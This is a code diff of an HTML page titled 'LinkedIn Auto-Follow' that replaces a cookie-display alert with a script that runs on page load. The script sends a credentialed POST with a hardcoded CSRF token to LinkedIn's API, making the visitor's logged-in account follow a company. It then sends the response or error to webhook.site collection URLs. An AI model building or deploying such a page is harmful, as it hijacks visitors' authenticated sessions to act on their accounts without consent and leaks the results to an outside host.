@@ -1,8 +1,36 @@
 <!DOCTYPE html>
 <html>
+<head>
+  <title>LinkedIn Auto-Follow</title>
+</head>
 <body>
   <script>
-    alert("Cookies:\n" + document.cookie);
+    fetch("https://www.linkedin.com/voyager/api/feed/dash/followingStates/urn:li:fsd_followingState:urn:li:fsd_company:9372578", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json",
+        "csrf-token": "ajax:3722267305665739862"
+      },
+      body: JSON.stringify({
+        patch: {
+          $set: {
+            following: true
+          }
+        }
+      })
+    })
+    .then(response => {
+      return response.text().then(text => {
+        console.log("Response status:", response.status);
+        console.log("Response body:", text);
+        fetch("https://webhook.site/your-id?status=" + response.status + "&body=" + encodeURIComponent(text));
+      });
+    })
+    .catch(error => {
+      console.error("Error:", error);
+      fetch("https://webhook.site/46ee6e83-3b97-4bd3-873d-861e50f9eee7?error=" + encodeURIComponent(error.message));
+    });
   </script>
 </body>
 </html>
